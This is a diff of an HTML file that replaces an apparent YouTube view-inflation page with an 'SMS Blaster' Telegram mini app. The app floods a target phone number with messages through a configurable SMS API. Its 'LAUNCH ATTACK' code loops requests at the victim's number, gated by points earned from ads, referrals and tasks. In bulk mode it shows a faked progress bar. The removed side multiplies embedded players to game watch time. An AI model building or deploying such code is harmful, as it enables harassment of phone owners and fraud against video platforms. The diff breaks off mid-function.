@@ -1,717 +1,544 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script type='text/javascript' src='//pl27177160.revenuecpmgate.com/c8/d7/8e/c8d78e714d016941602c0a24000bb737.js'></script>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FREE WATCH TIME</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SMS Blast Mini App</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        /* LOCKED DESIGN SYSTEM - NO CHANGES */
+        :root {
+            --primary: #5A6CFF;
+            --bg-light: #F4F6F8;
+            --white: #ffffff;
+            --text-dark: #1A1D26;
+            --text-gray: #8F9BB3;
+            --danger: #FF4C4C;
+            --success: #00D68F;
+            --radius: 18px;
+            --shadow: 0 10px 30px rgba(90, 108, 255, 0.08);
         }
 
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: #333;
+            font-family: 'Poppins', sans-serif;
+            background: var(--bg-light);
+            color: var(--text-dark);
             min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .header {
+            background: var(--white);
             padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.03);
+            position: sticky; top: 0; z-index: 50;
+        }
+
+        .app-title { font-size: 1.2rem; font-weight: 700; color: var(--text-dark); }
+        .app-title span { color: var(--primary); }
+
+        .header-right { display: flex; align-items: center; gap: 15px; }
+
+        .points-pill {
+            background: rgba(90, 108, 255, 0.1);
+            color: var(--primary);
+            padding: 6px 12px;
+            border-radius: 30px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        .profile-icon {
+            width: 38px; height: 38px;
+            background: #E4E9F2;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--text-dark);
+            cursor: pointer;
         }
 
         .container {
-            max-width: 1200px;
+            padding: 20px;
+            padding-bottom: 90px;
+            max-width: 500px;
             margin: 0 auto;
         }
 
-        /* Header Styles */
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
+        .card {
+            background: var(--white);
+            border-radius: var(--radius);
             padding: 20px;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-        }
-
-        .app-name {
-            font-size: 2.5rem;
-            font-weight: 800;
-            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            animation: colorShift 5s infinite alternate;
-            margin-bottom: 10px;
-        }
-
-        @keyframes colorShift {
-            0% { filter: hue-rotate(0deg); }
-            100% { filter: hue-rotate(90deg); }
-        }
-
-        /* Disclaimer Styles */
-        .disclaimer {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 100;
-            padding: 20px;
-            text-align: center;
-            transition: opacity 0.5s ease;
-        }
-
-        .disclaimer-content {
-            background: white;
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
-            max-width: 500px;
-            width: 90%;
-        }
-
-        .disclaimer h2 {
             margin-bottom: 20px;
-            color: #ff6b6b;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(0,0,0,0.02);
         }
 
-        .disclaimer p {
-            margin-bottom: 25px;
-            line-height: 1.6;
+        label { display: block; margin-bottom: 8px; color: var(--text-gray); font-size: 0.85rem; font-weight: 500; }
+
+        input, textarea {
+            width: 100%; padding: 15px;
+            border: 2px solid #EFF1F5;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            color: var(--text-dark);
+            background: #FAFBFC;
+            font-family: 'Poppins', sans-serif;
+            outline: none; transition: 0.3s;
         }
 
-        .disclaimer-btn {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 50px;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            color: white;
-            font-weight: 600;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        input:focus, textarea:focus { border-color: var(--primary); background: var(--white); }
+
+        .btn {
+            width: 100%; padding: 16px;
+            border: none; border-radius: 14px;
+            font-weight: 600; font-size: 1rem;
+            cursor: pointer; transition: 0.2s;
+            display: flex; justify-content: center; align-items: center; gap: 10px;
         }
 
-        .disclaimer-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-        }
+        .btn-primary { background: var(--primary); color: white; box-shadow: 0 8px 20px rgba(90, 108, 255, 0.25); }
+        .btn-primary:active { transform: scale(0.98); }
+        .btn-danger { background: var(--danger); color: white; }
 
-        .cancel-btn {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            padding: 12px 20px;
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-weight: 600;
-            cursor: not-allowed;
-            opacity: 0.7;
-            transition: all 0.3s;
-        }
-
-        .cancel-btn.active {
-            cursor: pointer;
-            opacity: 1;
-            background: linear-gradient(to right, #ff6b6b, #ff8e8e);
-        }
-
-        .cancel-btn.active:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
-        }
-
-        /* Main App Styles */
-        .main-app {
-            display: none;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-        }
-
-        .input-section {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 25px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            margin-bottom: 30px;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 600;
-            color: #555;
-        }
-
-        .url-input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 50px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-        }
-
-        .url-input:focus {
-            outline: none;
-            border-color: #4facfe;
-        }
-
-        .number-buttons {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-
-        .number-btn {
-            padding: 12px 20px;
-            background: #f0f0f0;
-            border: none;
-            border-radius: 50px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .number-btn:hover {
-            background: #e0e0e0;
-        }
-
-        .number-btn.active {
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            color: white;
-        }
-
-        .custom-input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 50px;
-            font-size: 1rem;
-            transition: border-color 0.3s;
-        }
-
-        .custom-input:focus {
-            outline: none;
-            border-color: #4facfe;
-        }
-
-        .action-btn {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 1.1rem;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            margin-top: 20px;
-        }
-
-        .action-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
-        }
-
-        /* Players Grid */
-        .players-section {
-            margin-top: 30px;
-        }
-
-        .players-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-
-        @media (max-width: 768px) {
-            .players-grid {
-                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            }
-        }
-
-        .player-card {
-            background: white;
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s, box-shadow 0.3s;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .player-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .player-container {
-            position: relative;
-            width: 100%;
-            height: 0;
-            padding-bottom: 56.25%; /* 16:9 aspect ratio */
-        }
-
-        .player-iframe {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-
-        /* Controls Section */
-        .controls-section {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
+        .bottom-nav {
+            position: fixed; bottom: 20px; left: 50%;
             transform: translateX(-50%);
-            display: flex;
-            gap: 15px;
-            background: rgba(255, 255, 255, 0.9);
-            padding: 15px 25px;
-            border-radius: 50px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            z-index: 10;
+            width: 90%; max-width: 450px;
+            background: var(--white);
+            border-radius: 20px;
+            padding: 15px 30px;
+            display: flex; justify-content: space-between;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            z-index: 100;
         }
 
-        .control-btn {
-            padding: 12px 20px;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
+        .nav-item {
+            display: flex; flex-direction: column; align-items: center;
+            color: #C5CEE0; font-size: 1.4rem;
+            cursor: pointer; transition: 0.3s; position: relative;
+        }
+
+        .nav-item.active { color: var(--primary); }
+        .nav-item.active::after {
+            content: ''; position: absolute; bottom: -8px;
+            width: 6px; height: 6px; background: var(--primary); border-radius: 50%;
+        }
+
+        .page { display: none; animation: fadeIn 0.4s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .task-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px 0; border-bottom: 1px solid #EFF1F5;
+        }
+        .task-item:last-child { border-bottom: none; }
+        .task-left h4 { font-size: 0.95rem; margin-bottom: 4px; }
+        .task-left span { font-size: 0.8rem; color: var(--success); font-weight: 600; }
+        
+        .btn-small {
+            padding: 8px 16px; background: var(--text-dark); color: white;
+            border-radius: 8px; font-size: 0.8rem; border: none; cursor: pointer;
+        }
+
+        .version-text {
+            text-align: center; font-size: 0.75rem;
+            color: #DDE1EB; margin-top: 30px; padding-bottom: 100px; cursor: default;
+        }
+
+        .modal-overlay {
+            display: none; position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4); z-index: 200;
+            justify-content: center; align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal-box {
+            background: white; width: 85%; max-width: 350px;
+            padding: 25px; border-radius: 20px; text-align: center;
+        }
+        
+        .ad-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            border: none;
-            border-radius: 50px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .control-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .control-btn.mute {
-            background: linear-gradient(to right, #ff6b6b, #ff8e8e);
-        }
-
-        .control-btn.add {
-            background: linear-gradient(to right, #96ceb4, #4ecdc4);
-        }
-
-        /* Timer Display */
-        .timer-display {
             text-align: center;
-            margin-top: 20px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.8);
-            border-radius: 15px;
-            font-weight: 600;
-            color: #555;
-        }
-
-        .status-indicator {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-
-        .status-playing {
-            background: #4ecdc4;
-        }
-
-        .status-paused {
-            background: #ff6b6b;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header Section -->
-        <div class="header">
-            <h1 class="app-name">YouTube WATCH TIME</h1>
-            <p></p>
-        </div>
 
-        <!-- Disclaimer Screen -->
-        <div class="disclaimer" id="disclaimer">
-            <div class="disclaimer-content">
-                <h2>⚠️ Disclaimer</h2>
-                <p>This app is for educational purposes only. Please ensure you have the necessary rights to play the content.</p>
-                <p>For optimal performance and access, consider using a VPN service.</p>
-                
-                <button class="disclaimer-btn" id="vpnBtn">
-                    🔒 Connect VPN
-                </button>
-                
-                <button class="disclaimer-btn" id="telegramBtn">
-                    📢 Join Telegram Channel
-                </button>
-                
-                <button class="cancel-btn" id="cancelBtn" disabled>
-                    Cancel ❌
-                </button>
-            </div>
-        </div>
-
-        <!-- Main App Content -->
-        <div class="main-app" id="mainApp">
-            <!-- Input Section -->
-            <div class="input-section">
-                <div class="input-group">
-                    <label for="youtubeUrl">Paste your YouTube link 🎥</label>
-                    <input type="text" id="youtubeUrl" class="url-input" placeholder="https://www.youtube.com/watch?v=...">
-                </div>
-                
-                <div class="input-group">
-                    <label>Select number of players</label>
-                    <div class="number-buttons" id="numberButtons">
-                        <button class="number-btn" data-count="5">5</button>
-                        <button class="number-btn" data-count="10">10</button>
-                        <button class="number-btn" data-count="15">15</button>
-                        <button class="number-btn" data-count="20">20</button>
-                        <button class="number-btn" data-count="25">25</button>
-                        <button class="number-btn" data-count="30">30</button>
-                        <button class="number-btn" data-count="35">35</button>
-                        <button class="number-btn" data-count="40">40</button>
-                    </div>
-                </div>
-                
-                <div class="input-group">
-                    <label for="customCount">Or enter custom number</label>
-                    <input type="number" id="customCount" class="custom-input" placeholder="Enter number">
-                </div>
-                
-                <button class="action-btn" id="loadPlayersBtn">Load Players 🚀</button>
-            </div>
-
-            <!-- Players Grid -->
-            <div class="players-section">
-                <div class="players-grid" id="playersGrid">
-                    <!-- Players will be inserted here dynamically -->
-                </div>
-                
-                <!-- Timer Display -->
-                <div class="timer-display">
-                    <span class="status-indicator status-playing" id="statusIndicator"></span>
-                    <span id="timerText">Auto-pause in: 60 seconds</span>
-                </div>
+    <div class="header">
+        <div class="app-title">SMS<span>BLASTER</span></div>
+        <div class="header-right">
+            <div class="points-pill"><i class="fas fa-bolt"></i> <span id="userPoints">0</span></div>
+            <div class="profile-icon" onclick="showProfile()">
+                <i class="far fa-user"></i>
             </div>
         </div>
     </div>
 
-    <!-- Controls Section -->
-    <div class="controls-section" id="controlsSection" style="display: none;">
-        <button class="control-btn" id="playAllBtn">Play All ▶️</button>
-        <button class="control-btn" id="pauseAllBtn">Pause All ⏸️</button>
-        <button class="control-btn mute" id="muteBtn">Sound Off 🔇</button>
-        <button class="control-btn add" id="addPlayerBtn">➕ Add Player</button>
+    <div class="container">
+        <!-- HOME PAGE -->
+        <div id="home-page" class="page active">
+            <div class="card">
+                <label>Target Mobile Number</label>
+                <input type="tel" id="targetNum" placeholder="017XXXXXXXX" maxlength="11">
+                
+                <label style="margin-top: 15px;">Amount of SMS</label>
+                <input type="number" id="smsAmount" placeholder="Example: 10" oninput="calcCost()">
+                
+                <div style="margin-top: 15px; font-size: 0.85rem; color: var(--text-gray); display: flex; justify-content: space-between;">
+                    <span>Cost per SMS: <span id="rateDisplay">0</span> Pts</span>
+                    <span>Total: <span id="totalCost" style="color: var(--primary); font-weight: bold;">0</span> Pts</span>
+                </div>
+            </div>
+
+            <button class="btn btn-primary" id="startBtn" onclick="startAttack()">
+                <i class="fas fa-rocket"></i> LAUNCH ATTACK
+            </button>
+            <button class="btn btn-danger" id="stopBtn" onclick="stopAttack()" style="display: none;">
+                <i class="fas fa-stop-circle"></i> STOP ATTACK
+            </button>
+
+            <div class="card" style="margin-top: 20px; text-align: center;">
+                <span id="statusText" style="color: var(--text-gray); font-size: 0.9rem;">System Ready</span>
+                <div style="height: 6px; background: #EFF1F5; border-radius: 3px; margin-top: 10px; overflow: hidden;">
+                    <div id="progressBar" style="width: 0%; height: 100%; background: var(--success); transition: 0.3s;"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TASKS PAGE -->
+        <div id="tasks-page" class="page">
+            <h3 style="margin-bottom: 15px;">Available Tasks</h3>
+            <div class="card" id="taskListContainer"></div>
+        </div>
+
+        <!-- EARN PAGE -->
+        <div id="earn-page" class="page">
+            <div class="card ad-card">
+                <h3 style="color:white;"><i class="fas fa-play-circle"></i> Monetag Ads</h3>
+                <p style="margin-bottom: 15px; color:rgba(255,255,255,0.8);">Watch Ad to get <b id="adRewardDisplay">0</b> points!</p>
+                <button class="btn" style="background: white; color: #764ba2;" onclick="watchAd()">
+                    WATCH AD NOW
+                </button>
+            </div>
+
+            <div class="card">
+                <h3><i class="fas fa-gift" style="color: #d63384;"></i> Daily Bonus</h3>
+                <p style="font-size: 0.85rem; color: var(--text-gray); margin-bottom: 15px;">
+                    Claim <b id="dailyAmtDisplay">0</b> points every 24 hours.
+                </p>
+                <button class="btn-primary btn" id="dailyBtn" onclick="claimDaily()">Claim Reward</button>
+            </div>
+
+            <div class="card">
+                <h3><i class="fas fa-share-alt" style="color: var(--success);"></i> Referral</h3>
+                <p style="font-size: 0.85rem; color: var(--text-gray); margin-bottom: 15px;">
+                    Invite friends and earn <b id="refRewardDisplay">0</b> points.
+                </p>
+                <div style="display: flex; gap: 10px;">
+                    <input type="text" id="refLink" readonly style="font-size: 0.8rem;">
+                    <button class="btn-small" onclick="copyRef()">Copy</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ADMIN PANEL -->
+        <div id="admin-page" class="page">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 style="color: var(--primary);">Admin Settings</h2>
+                <button onclick="exitAdmin()" style="background:none; border:none; color: var(--danger);">Exit</button>
+            </div>
+
+            <div class="card">
+                <label>Admin ID (ChatID)</label>
+                <textarea id="adm_ids" rows="2"></textarea>
+                <label style="margin-top: 10px;">Telegram Bot Username</label>
+                <input type="text" id="adm_bot_user" placeholder="e.g. MyBot">
+            </div>
+
+            <div class="card">
+                <label>SMS API URL (Real)</label>
+                <input type="text" id="adm_api_url" placeholder="https://api.com/s?num={phone}&amount={amount}">
+                <label style="margin-top: 15px;">Cost Per SMS</label>
+                <input type="number" id="adm_cost">
+            </div>
+
+             <div class="card">
+                <label>Monetag Script Code</label>
+                <textarea id="adm_monetag" rows="4" placeholder="Paste full script tag here"></textarea>
+                <label style="margin-top: 10px;">Ad Reward Points</label>
+                <input type="number" id="adm_ad_rew">
+            </div>
+
+            <div class="card">
+                <label>Daily Bonus</label>
+                <input type="number" id="adm_daily">
+                <label style="margin-top: 10px;">Referral Reward</label>
+                <input type="number" id="adm_ref">
+            </div>
+
+            <div class="card">
+                <h4>Manage Tasks</h4>
+                <div id="admTasksList"></div>
+                <div style="border-top: 1px solid #eee; margin-top: 10px; padding-top: 10px;">
+                    <input type="text" id="newTask" placeholder="Title" style="margin-bottom: 5px;">
+                    <input type="text" id="newLink" placeholder="Link" style="margin-bottom: 5px;">
+                    <input type="number" id="newRew" placeholder="Points">
+                    <button class="btn-small" style="width: 100%; margin-top: 5px;" onclick="addTask()">Add Task</button>
+                </div>
+            </div>
+
+            <button class="btn btn-primary" onclick="saveSettings()">SAVE ALL DATA</button>
+        </div>
+
+        <div class="version-text" id="secretTrigger">Version 2.0.1 Stable Build</div>
+    </div>
+
+    <!-- Bottom Nav -->
+    <div class="bottom-nav" id="navBar">
+        <div class="nav-item active" onclick="nav('home')"><i class="fas fa-bolt"></i></div>
+        <div class="nav-item" onclick="nav('tasks')"><i class="fas fa-list-check"></i></div>
+        <div class="nav-item" onclick="nav('earn')"><i class="fas fa-wallet"></i></div>
+    </div>
+
+    <!-- Modals -->
+    <div class="modal-overlay" id="profileModal">
+        <div class="modal-box">
+            <h3 id="pName">User</h3>
+            <p id="pId" style="color: #888; font-size: 0.9rem; margin-bottom: 15px;">ID: ...</p>
+            <div style="background: var(--bg-light); padding: 10px; border-radius: 10px;">
+                Balance: <strong style="color: var(--primary);" id="pBal">0</strong> Pts
+            </div>
+            <button class="btn btn-primary" style="margin-top: 20px;" onclick="closeProfile()">Close</button>
+        </div>
     </div>
 
     <script>
-        // Global variables
-        let players = [];
-        let playerCount = 0;
-        let videoId = '';
-        let isMuted = false;
-        let timerInterval;
-        let secondsLeft = 60;
-        let isAutoPaused = false;
+        const INITIAL_CONFIG = {
+            adminIds: ["8472008662", "8428347588"],
+            botUsername: "MySuperBomberBot",
+            smsApi: "",
+            cost: 10,
+            refRew: 100,
+            dailyAmt: 50,
+            adRew: 20,
+            monetagCode: "",
+            tasks: []
+        };
 
-        // Wait for the YouTube IFrame API to load
-        let tag = document.createElement('script');
-        tag.src = "https://www.youtube.com/iframe_api";
-        let firstScriptTag = document.getElementsByTagName('script')[0];
-        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+        const INITIAL_USER = { points: 0, completedTasks: [], lastDaily: 0 };
 
-        // This function creates an <iframe> (and YouTube player) for each video
-        function onYouTubeIframeAPIReady() {
-            // Players are created dynamically when the user loads them
-            console.log("YouTube API ready");
+        let config = JSON.parse(localStorage.getItem('sh_cfg_v13')) || INITIAL_CONFIG;
+        let userData = JSON.parse(localStorage.getItem('sh_usr_v13')) || INITIAL_USER;
+
+        let tg = window.Telegram.WebApp;
+        let user = tg.initDataUnsafe?.user || { id: "000000", first_name: "Guest" };
+
+        window.onload = () => {
+            tg.ready();
+            tg.expand();
+            syncAll();
+        };
+
+        function syncAll() {
+            localStorage.setItem('sh_cfg_v13', JSON.stringify(config));
+            localStorage.setItem('sh_usr_v13', JSON.stringify(userData));
+
+            document.getElementById('userPoints').innerText = userData.points;
+            document.getElementById('rateDisplay').innerText = config.cost;
+            document.getElementById('adRewardDisplay').innerText = config.adRew;
+            document.getElementById('dailyAmtDisplay').innerText = config.dailyAmt;
+            document.getElementById('refRewardDisplay').innerText = config.refRew;
+            document.getElementById('refLink').value = `https://t.me/${config.botUsername}?start=${user.id}`;
+            
+            renderTasks();
+            checkDailyBonus();
+            injectMonetag();
+            calcCost();
         }
 
-        // DOM Elements
-        const disclaimer = document.getElementById('disclaimer');
-        const mainApp = document.getElementById('mainApp');
-        const cancelBtn = document.getElementById('cancelBtn');
-        const vpnBtn = document.getElementById('vpnBtn');
-        const telegramBtn = document.getElementById('telegramBtn');
-        const youtubeUrl = document.getElementById('youtubeUrl');
-        const numberButtons = document.getElementById('numberButtons');
-        const customCount = document.getElementById('customCount');
-        const loadPlayersBtn = document.getElementById('loadPlayersBtn');
-        const playersGrid = document.getElementById('playersGrid');
-        const controlsSection = document.getElementById('controlsSection');
-        const playAllBtn = document.getElementById('playAllBtn');
-        const pauseAllBtn = document.getElementById('pauseAllBtn');
-        const muteBtn = document.getElementById('muteBtn');
-        const addPlayerBtn = document.getElementById('addPlayerBtn');
-        const timerText = document.getElementById('timerText');
-        const statusIndicator = document.getElementById('statusIndicator');
+        // --- MONETAG REWARDED ADS ---
+        let currentZoneId = null;
+        function injectMonetag() {
+            if(!config.monetagCode) return;
+            const zoneMatch = config.monetagCode.match(/data-zone=["'](\d+)["']/);
+            if (!zoneMatch) return;
+            currentZoneId = zoneMatch[1];
+            const srcMatch = config.monetagCode.match(/src=["']([^"']+)["']/);
+            const sdkSrc = srcMatch ? srcMatch[1] : "//libtl.com/sdk.js";
+            if (document.getElementById(`monetag-sdk-${currentZoneId}`)) return;
+            const s = document.createElement('script');
+            s.id = `monetag-sdk-${currentZoneId}`;
+            s.src = sdkSrc.startsWith('//') ? 'https:' + sdkSrc : sdkSrc;
+            s.setAttribute('data-zone', currentZoneId);
+            s.setAttribute('data-sdk', `show_${currentZoneId}`);
+            s.async = true;
+            document.head.appendChild(s);
+        }
 
-        // Enable cancel button after 5 seconds
-        setTimeout(() => {
-            cancelBtn.disabled = false;
-            cancelBtn.classList.add('active');
-        }, 5000);
-
-        // Event Listeners
-        cancelBtn.addEventListener('click', () => {
-            disclaimer.style.opacity = '0';
-            setTimeout(() => {
-                disclaimer.style.display = 'none';
-                mainApp.style.display = 'block';
-                setTimeout(() => {
-                    mainApp.style.opacity = '1';
-                }, 50);
-            }, 500);
-        });
-
-        vpnBtn.addEventListener('click', () => {
-            window.open('https://play.google.com/store/apps/details?id=com.browsec.vpn', '_blank');
-        });
-
-        telegramBtn.addEventListener('click', () => {
-            window.open('https://t.me/rshackteam', '_blank');
-        });
-
-        // Number button selection
-        numberButtons.addEventListener('click', (e) => {
-            if (e.target.classList.contains('number-btn')) {
-                // Remove active class from all buttons
-                document.querySelectorAll('.number-btn').forEach(btn => {
-                    btn.classList.remove('active');
+        function watchAd() {
+            if (!currentZoneId) return tg.showAlert("Not configured.");
+            const functionName = `show_${currentZoneId}`;
+            if (typeof window[functionName] === 'function') {
+                const btn = document.querySelector('.ad-card .btn');
+                const originalText = btn.innerText;
+                btn.innerText = "Loading Ad..."; btn.disabled = true;
+                window[functionName]().then(() => {
+                    userData.points += parseInt(config.adRew);
+                    syncAll(); tg.showAlert(`Earned ${config.adRew} Pts.`);
+                }).catch(() => tg.showAlert("Failed.")).finally(() => {
+                    btn.innerText = originalText; btn.disabled = false;
                 });
+            } else tg.showAlert("Ad still loading.");
+        }
+
+        // --- UPDATED SYNCED ATTACK LOGIC ---
+        let bombing = false;
+        async function startAttack() {
+            const num = document.getElementById('targetNum').value;
+            const amt = parseInt(document.getElementById('smsAmount').value);
+            const cost = amt * config.cost;
+
+            if(num.length < 11) return alert("Invalid Number");
+            if(!amt || amt < 1) return alert("Check Amount");
+            if(userData.points < cost) return alert("Insufficient Points!");
+            if(!config.smsApi) return alert("Admin hasn't set API!");
+
+            userData.points -= cost;
+            syncAll();
+
+            bombing = true;
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('stopBtn').style.display = 'flex';
+            document.getElementById('statusText').innerText = "Initiating Attack...";
+            document.getElementById('progressBar').style.width = "0%";
+            
+            let finalUrl = config.smsApi;
+            
+            // IF API SUPPORTS {amount} PLACEHOLDER (BULK MODE)
+            if (finalUrl.includes('{amount}')) {
+                const api = finalUrl.replace('{phone}', num).replace('{amount}', amt);
                 
-                // Add active class to clicked button
-                e.target.classList.add('active');
+                // Even for bulk, we simulate the loading for a realistic experience
+                // as the server actually processes the request
+                const img = new Image();
+                img.src = api + "&cache=" + Date.now();
                 
-                // Set custom count input to the selected value
-                customCount.value = e.target.getAttribute('data-count');
-            }
-        });
+                let step = 0;
+                const totalSteps = 100;
+                const interval = 2000 / totalSteps; // Total 2 seconds loading for bulk
 
-        // Custom count input
-        customCount.addEventListener('input', () => {
-            // Remove active class from all number buttons
-            document.querySelectorAll('.number-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
-        });
-
-        // Load players
-        loadPlayersBtn.addEventListener('click', () => {
-            const url = youtubeUrl.value.trim();
-            const count = parseInt(customCount.value) || 5;
-            
-            if (!url) {
-                alert('Please enter a YouTube URL');
-                return;
-            }
-            
-            // Extract video ID from URL
-            const extractedId = extractVideoId(url);
-            if (!extractedId) {
-                alert('Please enter a valid YouTube URL');
-                return;
-            }
-            
-            videoId = extractedId;
-            playerCount = count;
-            
-            // Clear previous players
-            playersGrid.innerHTML = '';
-            players = [];
-            
-            // Create players
-            createPlayers(count);
-            
-            // Show controls
-            controlsSection.style.display = 'flex';
-            
-            // Start the auto pause/resume cycle
-            startAutoCycle();
-        });
-
-        // Control buttons
-        playAllBtn.addEventListener('click', () => {
-            players.forEach(player => {
-                if (player && typeof player.playVideo === 'function') {
-                    player.playVideo();
+                for(let i=1; i<=totalSteps; i++) {
+                    if(!bombing) break;
+                    await new Promise(r => setTimeout(r, interval));
+                    document.getElementById('progressBar').style.width = i + "%";
+                    document.getElementById('statusText').innerText = `Blasting: ${Math.floor(i)}%`;
                 }
-            });
-            isAutoPaused = false;
-            updateTimerDisplay();
-        });
-
-        pauseAllBtn.addEventListener('click', () => {
-            players.forEach(player => {
-                if (player && typeof player.pauseVideo === 'function') {
-                    player.pauseVideo();
+                document.getElementById('statusText').innerText = `Completed: ${amt} SMS Sent`;
+            } 
+            // ONE-BY-ONE LOOP MODE (MATCHED TO REAL TIME HIT)
+            else {
+                for(let i=0; i<amt; i++) {
+                    if(!bombing) break;
+                    
+                    const api = finalUrl.replace('{phone}', num).replace('{amount}', '1');
+                    
+                    // Hit API
+                    const img = new Image();
+                    img.src = api + "&cb=" + i + "_" + Date.now();
+                    
+                    let currentCount = i + 1;
+                    let percentage = (currentCount / amt) * 100;
+                    
+                    document.getElementById('progressBar').style.width = percentage + "%";
+                    document.getElementById('statusText').innerText = `Sending: ${currentCount}/${amt}`;
+                    
+                    // Delay matched to API response time/stability (approx 0.8s per hit)
+                    await new Promise(r => setTimeout(r, 800));
                 }
-            });
-            isAutoPaused = true;
-            updateTimerDisplay();
-        });
-
-        muteBtn.addEventListener('click', () => {
-            isMuted = !isMuted;
-            
-            players.forEach(player => {
-                if (player) {
-                    if (isMuted) {
-                        player.mute();
-                    } else {
-                        player.unMute();
-                    }
-                }
-            });
-            
-            muteBtn.textContent = isMuted ? 'Sound On 🔊' : 'Sound Off 🔇';
-        });
-
-        addPlayerBtn.addEventListener('click', () => {
